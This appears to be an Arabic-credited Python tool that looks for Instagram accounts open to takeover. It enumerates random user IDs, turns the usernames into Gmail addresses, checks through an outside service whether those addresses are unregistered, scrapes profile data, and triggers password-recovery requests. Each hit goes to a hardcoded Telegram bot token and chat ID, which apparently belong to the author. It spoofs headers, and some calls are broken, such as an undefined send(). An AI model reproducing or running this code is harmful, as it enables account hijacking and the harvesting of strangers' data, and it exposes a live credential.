import os
os.system("pip install requests")
os.system("pip install hashlib")
os.system("pip install uuid")
os.system("pip install user_agent")
os.system("pip install urllib.request")
import json
import random
import requests
import requests
from hashlib import md5
import time
from uuid import uuid4
from random import randrange
from user_agent import generate_user_agent
import json
import uuid
import requests
from user_agent import generate_user_agent
from secrets import token_hex
from uuid import uuid4
import urllib.request
from threading import Thread
uid = uuid4()
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\x1b[38;5;208m'  # برتقالي
Y = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابیض
S = '\033[1;33m'
U = '\x1b[1;37m'  # ابیض
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'

print(f'''{B}{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━{B}
|{Z}[√] YouTube    : {B}| أحمد الحراني
|{Z}[√] TeleGram  : {B} maho_s9    |
|{Z}[√] Instagram  : {B}ahmedalharrani |
|{Z}[√] Tool  : {B} متاحات-  IG |
{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━━━━━━ ''')

token = "6445458149:AAGTx7KQe8slPu2AcmCczQrbkR-_zhs7YWo"
print(X + ' ═════════════════════════════════  ')
ID = 749219602
def info(email):
    user = email.split('@')[0]
    headers = {
        'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
        'X-Pigeon-Rawclienttime': '1700251574.982',
        'X-IG-Connection-Speed': '-1kbps',
        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
        'X-IG-Bandwidth-TotalBytes-B': '0',
        'X-IG-Bandwidth-TotalTime-MS': '0',
        'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-App-ID': '567067343352427',
        'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
        'Accept-Language': 'en-GB, en-US',
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Host': 'i.instagram.com',
        'X-FB-HTTP-Engine': 'Liger',
        'Connection': 'keep-alive',
        'Content-Length': '356',
    }

    data = {
        'signed_body': f'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{uuid4()}","guid":"{uuid4()}","device_id":"{uuid4()}","query":"{user}"}}',
        'ig_sig_key_version': '4',
    }

    res = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data)
    if '"status":"ok"' in res.text:
        rest = res.json()['email']
    else:
        rest = 'Band Requests!'

    try:
        ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
        pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]
        port = random.choice(pl)
        proxy = ip + ":" + str(port)
        uid = uuid4().hex.upper()
        csr = token_hex(8) * 2
        miid = token_hex(13).upper()
        dtr = token_hex(13)
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar,en;q=0.9',
            'cookie': f'ig_did={uid}; datr={dtr}; mid={miid}; ig_nrcb=1; csrftoken={csr}; ds_user_id=56985317140; dpr=1.25',
            'referer': f'https://www.instagram.com/{user}/?hl=ar',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.138", "Google Chrome";v="112.0.5615.138", "Not:A-Brand";v="99.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': generate_user_agent(),
            'viewport-width': '1051',
            'x-asbd-id': '198387',
            'x-csrftoken': str(csr),
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-requested-with': 'XMLHttpRequest',
        }
        rr = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={user}', headers=headers, proxies={'http': proxy})
        try:
            Id = rr.json()['data']['user']['id']
        except:
            Id = ""
        try:
            name = rr.json()['data']['user']['full_name']
        except:
            name = ""
        try:
            bio = rr.json()['data']['user']['biography']
        except:
            bio = ""
        try:
            po = rr.json()['data']['user']['edge_owner_to_timeline_media']['count']
        except:
            po = ""
        try:
            fols = rr.json()['data']['user']['edge_followed_by']['count']
        except:
            fols = ""
        try:
            folg = rr.json()['data']['user']['edge_follow']['count']
        except:
            folg = ""
        try:
            pr = rr.json()['data']['user']['is_private']
        except:
            pr = ""
        try:
            profile_pic_url = rr.json()['data']['user']['profile_pic_url']
            profile_pic_path = f"{user}.jpg"
            urllib.request.urlretrieve(profile_pic_url, profile_pic_path)
        except:
            profile_pic_url = ""
        
        try:
            re = requests.get(f"https://o7aa.pythonanywhere.com/?id={Id}")
            da = re.json()['date']
        except:
            da = 'No Date'

        tlg = f'''
HI MAHOS GIVE YOU HIT
________________________,
[√] Email ==> {email}
[√] E-mail Rest ==> {rest}
[√] Username ==> @{user}
[√] Name ==> {name}
[√] ID ==> {Id}
[√] Followers ==> {fols}
[√] Following ==> {folg}
[√] Bio ==> {bio}
[√] Posts ==> {po}
[√] Date ==> {da}
[√] Is Private ==> {pr}
[√] Url ==> https://www.instagram.com/{user}
_______BEST DEV_________
@maho_s9 - @maho9s
'''
        print(F+tlg)
        with open(profile_pic_path, 'rb') as photo:
            files = {'photo': photo}
            requests.post(f"https://api.telegram.org/bot{token}/sendPhoto?chat_id={ID}&caption=" + str(tlg), files=files)
    except Exception as e:
        print(e)
        tlg = f'''
 username = {user}
 email = {email}
        '''
        requests.post(f"https://api.telegram.org/bot{token}/sendPhoto?chat_id={ID}&text=" + str(tlg))
        
    	
def mahos(email):
    global ok, error  
    response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', 
                         headers={'accept': '*/*',
                                  'accept-language': 'en-US,en;q=0.9',
                                  'content-type': 'application/x-www-form-urlencoded',
                                  'origin': 'https://www.instagram.com',
                                  'referer': 'https://www.instagram.com/accounts/signup/email/',
                                  'user-agent': generate_user_agent(),
                                  'x-csrftoken': md5(str(time.time()).encode()).hexdigest()},
                         data={'email': email})
    if 'email_is_taken' in response.text:
        print(f"{F} Available Instgram : {email}")
        send(email)                
    else:
        print(f"{Z}Bad Insta : {email}")
def ch(email):
    global no, hh    
    res = requests.get(
    f'https://gmail-mhros-e438ac1b0be7.herokuapp.com/qredes/gmail/?email={email}'
).text
    if '"status":"good"' in res:
        print(f"{B} GOOD Gmail : {email}")
        mahos(email)                
    else:
        print(f"{X}Bad Gmail : {email}")
        

def get_username():
    while True:
        try:
            id = str(randrange(10000, 30975110))      
            headers = {
                'authority': 'www.instagram.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'dnt': '1',
                'dpr': '0.8',
                'origin': 'https://www.instagram.com',
                'user-agent': generate_user_agent(),
                'x-csrftoken': md5(str(time.time()).encode()).hexdigest(),
            }
            data = {
                '__spin_b': 'trunk',
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                'variables': '{"userID":"' + id + '","username":"0s9s"}',
                'server_timestamps': 'true',
                'doc_id': '7666785636679494',
            }
            response = requests.post('https://www.instagram.com/graphql/query', headers=headers, data=data).json()
            usess = response['data']['user']['username']      
            email = usess + '@gmail.com'
            ch(email)
        except:
            print('اذا استمرت شغل VPN او طفي النت')
            pass
        
for i in range(3):
    Thread(target=get_username).start()
